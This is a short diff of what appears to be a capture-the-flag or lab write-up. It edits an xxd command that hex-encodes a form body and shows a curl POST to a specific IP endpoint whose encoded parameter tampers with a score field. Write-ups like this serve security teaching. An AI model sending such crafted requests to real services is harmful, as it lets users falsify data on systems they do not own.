@@ -33,7 +33,7 @@ username=test&email=test@gmail.com&score=1 {max_score + 1}
 Encoded and submitted:
 
 ```bash
-echo -n 'username=test&email=test@gmail.com&score=1' | xxd -p
+echo -n 'username=test&email=test@gmail.com&score=1' | xxd -p -c 9999
 
 curl -X POST http://141.85.224.115:7001/api-save-user.php \
   -d 'q=757365726e616d653d6461646126656d61696c3d78656e6f776176653140676d61696c2e636f6d2673636f72653d32' \
